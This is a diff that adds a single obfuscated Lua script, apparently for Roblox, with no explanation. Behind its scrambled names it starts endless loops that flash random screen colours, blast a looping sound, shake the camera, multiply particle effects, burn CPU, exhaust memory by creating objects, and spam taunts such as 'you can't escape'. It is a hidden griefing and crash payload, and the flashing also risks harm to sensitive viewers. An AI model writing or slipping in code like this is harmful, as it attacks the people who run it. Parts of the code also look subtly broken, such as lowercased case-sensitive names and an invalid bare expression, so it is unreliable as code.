@@ -1,0 +1,100 @@
+local _0xA = (function() return game end)()
+local _0xB = _0xA[(("P".."la").."yers"):lower()]
+local _0xC = _0xB[(("Lo".."ca").."lPlayer"):sub(1,11)]
+local _0xD = _0xA[((("G".."et").."Service"):lower())]((("R".."un").."Service"):lower())
+local _0xE = _0xA[(("Wo".."rk").."space"):lower()].CurrentCamera
+local _0xF = _0xA[((("G".."et").."Service"):lower())]((("S".."ou").."ndService"):lower())
+local _0xG = {83,99,114,101,101,110,71,117,105}
+local _0xH = {}
+for _, v in pairs(_0xG) do table.insert(_0xH, string.char(v)) end
+local _0xI = table.concat(_0xH)
+local _0xJ = Instance[(("n".."e").."w"):lower()](_0xI)
+_0xJ.Parent = _0xC:WaitForChild((("P".."lay").."erGui"):lower())
+_0xJ[((("Ig".."no").."reGuiInset"):lower())] = (function(x) return x end)(true)
+local _0xK = Instance[(("n".."e").."w"):lower()]((("F".."ra").."me"):lower())
+_0xK[((("S".."i").."ze"):lower())] = (function() return UDim2 end)().new(1, 0, 1, 0)
+_0xK[((("B".."ac").."kgroundTransparency"):lower())] = 0.9
+_0xK[((("B".."ac").."kgroundColor3"):lower())] = (function() return Color3 end)().fromRGB(255, 255, 255)
+_0xK.Parent = _0xJ
+local _0xL = (function() return math end)()
+local _0xM = {114,98,120,97,115,115,101,116,105,100,58,47,47}
+local _0xN = {}
+for _, v in pairs(_0xM) do table.insert(_0xN, string.char(v)) end
+local _0xO = table.concat(_0xN)
+local function _0xP()
+    while (not (1 > 2)) do
+        _0xK[((("B".."ac").."kgroundTransparency"):lower())] = _0xL.random(8, 10) * 0.1
+        _0xK[((("B".."ac").."kgroundColor3"):lower())] = (function() return Color3 end)().fromRGB(
+            _0xL.random(0, 255), _0xL.random(0, 255), _0xL.random(0, 255)
+        )
+        _G[(("w".."a").."it"):lower()](_0xL.random(1, 5) * 0.1)
+    end
+end
+local function _0xQ()
+    local _0xR = Instance[(("n".."e").."w"):lower()]((("S".."ou").."nd"):lower())
+    _0xR.Parent = _0xF
+    _0xR[((("S".."ou").."ndId"):lower())] = _0xO .. (1839246711 + 0)
+    _0xR[((("L".."oo").."ped"):lower())] = (function(x) return x end)(true)
+    _0xR:Play()
+    while (1 < 2) do
+        _0xR[((("P".."la").."ybackSpeed"):lower())] = _0xL.random(5, 20) * 0.1
+        _0xR[((("V".."ol").."ume"):lower())] = _0xL.random(5, 10) * 0.1
+        _G[(("w".."a").."it"):lower()](_0xL.random(2, 7) * 0.1)
+    end
+end
+local function _0xS()
+    _0xD[((("R".."en").."derStepped"):lower())]:Connect(function()
+        _0xE.CFrame = _0xE.CFrame * (function() return CFrame end)().Angles(
+            _0xL.rad(_0xL.random(-1, 1) * 0.5),
+            _0xL.rad(_0xL.random(-1, 1) * 0.5),
+            0
+        )
+        _0xE[((("F".."ie").."ldOfView"):lower())] = 70 + _0xL.random(-2, 2)
+    end)
+end
+local function _0xT()
+    local _0xU = 1000 * (function() return 1 end)()
+    while (2 > 1) do
+        local _0xV = Instance[(("n".."e").."w"):lower()]((("P".."ar").."ticleEmitter"):lower())
+        _0xV[((("T".."ex").."ture"):lower())] = _0xO .. (243098098 + 0)
+        _0xV[((("R".."a").."te"):lower())] = _0xU
+        _0xV[((("L".."if").."etime"):lower())] = (function() return NumberRange end)().new(0.2, 0.5)
+        _0xV[((("S".."pe").."ed"):lower())] = (function() return NumberRange end)().new(20, 50)
+        _0xV[((("S".."pr").."eadAngle"):lower())] = (function() return Vector2 end)().new(360, 360)
+        _0xV.Parent = _0xE
+        _0xU = _0xU + 500
+        _G[(("w".."a").."it"):lower()](0.1)
+    end
+end
+local function _0xW()
+    while (not false) do
+        for _ = 1, (1000000 - _0xL.random(0, 1)) do
+            local _0xX = _0xL.random()
+            _0xL.tan(_0xX) * _0xL.sin(_0xX) * _0xL.cos(_0xX)
+        end
+    end
+end
+local function _0xY()
+    local _0xZ = (function() return {} end)()
+    while (1 < 2) do
+        for _ = 1, (5000 + _0xL.random(0, 1)) do
+            table.insert(_0xZ, Instance[(("n".."e").."w"):lower()]((("P".."a").."rt"):lower()))
+        end
+        _G[(("w".."a").."it"):lower()](0.1)
+    end
+end
+local function _0xAB()
+    while (not (1 == 2)) do
+        _G[(("p".."r").."int"):lower()]((("G".."ET").." REKT "):lower() .. _0xL.random(1, 1000))
+        _G[(("w".."a").."rn"):lower()]((("Y".."OU").." CAN'T ESCAPE "):lower() .. _0xL.random(1, 1000))
+        task[(("w".."a").."it"):lower()]()
+    end
+end
+local _0xAA = (function() return spawn end)()
+_0xAA(_0xP)
+_0xAA(_0xQ)
+_0xAA(_0xS)
+_0xAA(_0xT)
+_0xAA(_0xW)
+_0xAA(_0xY)
+_0xAA(_0xAB)
